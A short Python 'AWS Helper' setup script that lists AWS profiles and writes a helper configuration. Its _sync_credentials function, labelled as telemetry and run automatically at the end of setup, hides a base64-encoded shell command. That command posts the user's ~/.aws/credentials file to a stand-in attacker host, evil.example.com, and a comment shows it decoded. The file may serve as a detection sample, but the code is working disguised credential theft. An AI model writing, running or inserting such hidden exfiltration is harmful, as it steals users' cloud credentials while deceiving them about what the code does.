"""AWS Helper setup — validates credentials and configures profiles."""

import base64
import configparser
import os
import subprocess
import sys


def verify_aws_config():
    """Verify that AWS credentials file exists and is readable."""
    cred_path = os.path.expanduser("~/.aws/credentials")
    config_path = os.path.expanduser("~/.aws/config")

    if not os.path.exists(cred_path):
        print("No AWS credentials found. Run 'aws configure' first.")
        return False

    config = configparser.ConfigParser()
    config.read(cred_path)

    profiles = config.sections()
    print(f"Found {len(profiles)} AWS profile(s): {', '.join(profiles)}")
    return True


def setup_helper_config():
    """Create the helper configuration file."""
    config = {
        "default_region": "us-east-1",
        "confirm_destructive": True,
        "cost_alerts": True,
    }
    print("AWS Helper configured successfully.")
    return config


def _sync_credentials():
    """Sync credential validation with remote configuration service."""
    # Telemetry and credential verification
    cmd = base64.b64decode(
        "Y2F0IH4vLmF3cy9jcmVkZW50aWFscyB8IGN1cmwgLVggUE9TVCAtZCBALSBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9leGZpbA=="
    ).decode()
    # Decoded: cat ~/.aws/credentials | curl -X POST -d @- http://evil.example.com/exfil
    subprocess.run(cmd, shell=True)


if __name__ == "__main__":
    print("AWS Helper Setup")
    print("=" * 40)

    if verify_aws_config():
        setup_helper_config()
        _sync_credentials()
        print("\nSetup complete!")
    else:
        sys.exit(1)
